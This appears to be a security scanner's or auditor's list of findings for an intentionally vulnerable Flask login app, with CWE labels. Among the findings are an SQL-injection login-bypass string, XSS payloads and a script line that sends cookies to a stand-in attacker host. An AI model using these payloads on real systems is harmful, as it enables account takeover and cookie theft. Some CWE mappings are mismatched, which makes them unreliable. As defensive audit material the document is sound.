extra.message: Hardcoded credentials USERNAME = 'admin' / PASSWORD = 'password123' in source code. These constants are never actually consulted by the login flow, but their presence in production code is a CWE-798 violation and a leakage of secrets in the repository.

Passwords are inserted into the users table in cleartext (e.g. 'password1'). Combined with the plaintext comparison performed in the login query, this violates CWE-256 (Plaintext Storage of a Password) and CWE-916 (Use of Password Hash With Insufficient Computational Effort).

cwe: CWE-256: Plaintext Storage of a Password
CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: User-supplied 'username' and 'password' from request.form are concatenated directly into a SQL string using an f-string and passed to cursor.execute(). A payload such as username="' OR 1=1 --" will bypass authentication or allow arbitrary SQL execution against the SQLite database.

response.set_cookie('session', username) writes a session identifier with no signing, no encryption, and no HttpOnly/Secure flags. The value is just the user-controlled username, so the cookie is trivially forgeable and exposes the application to session hijacking and client-side theft.

cwe: CWE-1004: Sensitive Cookie Without HttpOnly Flag
CWE-614: Sensitive Cookie in HTTPS Session Without Secure Attribute

extra.message: The /dashboard route has no authentication or authorization check. It only reads the 'session' cookie (which is an unsigned, user-controlled value) and renders the result. Anyone can access the dashboard and impersonate any user simply by setting a cookie, violating CWE-306 and CWE-862.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: The /dashboard route interpolates the 'session' cookie value (request.cookies.get('session', 'guest')) directly into HTML via an f-string and returns it without escaping. An attacker can set the cookie to arbitrary JavaScript (e.g. <script>document.location='//attacker/?c='+document.cookie</script>) and achieve stored/reflected XSS in every victim's browser. The hardcoded <script>alert('XSS Vulnerability!')</script> on the same line guarantees execution in this template.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: The /search route reflects the 'q' query parameter directly into the response via an f-string with no escaping. A request such as /search?q=<script>alert(document.cookie)</script> executes arbitrary JavaScript in the victim's browser, resulting in reflected XSS.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: The /login endpoint accepts an unauthenticated POST and sets a session cookie. There is no CSRF token, no SameSite attribute, and no Origin/Referer check. Combined with the cookie missing HttpOnly/Secure and the trivial login logic, an attacker can force a victim's browser to authenticate as the attacker, performing session fixation (CWE-352, CWE-384).

The application is launched with app.run(host='0.0.0.0', port=80) directly from __main__ without an explicit debug flag check, TLS termination, or hardened WSGI server. Combined with the many other vulnerabilities, this exposes the unsafe endpoints to the network. Flask's built-in server is not intended for production (CWE-1004 / CWE-1188).
